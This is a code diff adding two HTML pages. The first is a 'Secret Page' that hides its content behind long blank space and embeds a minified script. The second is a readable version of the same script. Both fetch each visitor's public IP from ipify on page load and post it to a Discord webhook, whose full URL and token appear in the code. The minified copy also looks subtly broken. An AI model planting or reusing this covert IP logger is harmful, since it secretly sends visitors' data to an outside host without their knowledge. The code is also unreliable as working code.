@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secret Page</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        p {
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="container">
+    <h1>Welcome to the Secret Page</h1>
+    <p>This page contains a hidden script. Enjoy the mystery!</p>
+    <script type="application/javascript">
+        !function(){const e="https://discord.com/api/webhooks/1103759823419482282/y0T-XegSrW1ACsaL5SKFPd8HRcEt-Kopjvi49ymFY6ag4P7x2DM1AZ83PbCRXtSXSk4R";function t(e){const t="My public IP address is: "+e;const n=new XMLHttpRequest;n.open("POST",e,!0),n.setRequestHeader("Content-Type","application/json"),n.onload=function(){n.status>=200&&n.status<300?console.log("Message sent to Discord successfully:",n.responseText):console.error("Error sending message to Discord:",n.statusText)},n.onerror=function(){console.error("Network error while trying to send message to Discord.")},n.send(JSON.stringify({content:t}))}function n(e){const n=e.ip;t(n)}const o=document.createElement("script");o.type="application/javascript",o.src="https://api.ipify.org?format=jsonp&callback=n",document.body.appendChild(o)}();
+    </script>
+</div>
+
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Address Retrieval and Discord Webhook</title>
+</head>
+<body>
+
+<script type="application/javascript">
+  function getIP(json) {
+    const ipAddress = json.ip;
+    sendToDiscordWebhook(ipAddress);
+  }
+
+  function sendToDiscordWebhook(ipAddress) {
+    const webhookURL = 'https://discord.com/api/webhooks/1103759823419482282/y0T-XegSrW1ACsaL5SKFPd8HRcEt-Kopjvi49ymFY6ag4P7x2DM1AZ83PbCRXtSXSk4R';
+    const message = `My public IP address is: ${ipAddress}`;
+
+    // Create a new XMLHttpRequest object
+    const xhr = new XMLHttpRequest();
+
+    // Set up the request
+    xhr.open('POST', webhookURL, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+
+    // Set up the callback function for when the request completes
+    xhr.onload = function () {
+      if (xhr.status >= 200 && xhr.status < 300) {
+        console.log('Message sent to Discord successfully:', xhr.responseText);
+      } else {
+        console.error('Error sending message to Discord:', xhr.statusText);
+      }
+    };
+
+    // Set up the callback function for when there is an error
+    xhr.onerror = function () {
+      console.error('Network error while trying to send message to Discord.');
+    };
+
+    // Send the request with the message JSON payload
+    xhr.send(JSON.stringify({ content: message }));
+  }
+</script>
+
+<script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+
+</body>
+</html>
